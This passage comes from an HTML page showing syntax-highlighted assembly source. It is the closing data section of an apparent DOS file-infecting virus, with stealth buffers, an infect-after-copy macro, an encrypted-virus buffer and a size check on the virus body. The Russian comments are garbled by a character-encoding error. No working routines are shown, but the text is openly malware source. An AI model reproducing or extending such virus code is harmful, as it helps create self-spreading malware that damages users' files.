</span><span class="sc5">stealth_buffer_8</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_9</span><span class="sc0">  </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_10</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_11</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_12</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_13</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_14</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_15</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_16</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_17</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_18</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_19</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">stealth_buffer_20</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;“ª § â¥«ì ­   ªâ¨¢­ë© ‘â¥«á ãää¥à</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">infect_after_copy_1</span><span class="sc0"> </span><span class="sc5">infect_after_copy</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">length_of_virus_in_bate</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">.errnz</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc2">4000H</span><span class="sc0"> </span><span class="sc1">;…á«¨ ­ è ¢¨àãá à §¤ã«áï ¢ à §¬¥à å ¡®«¥¥ ç¥¬ 16K</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">endvirus_in_memory</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pfl</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">seg_a</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">   </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
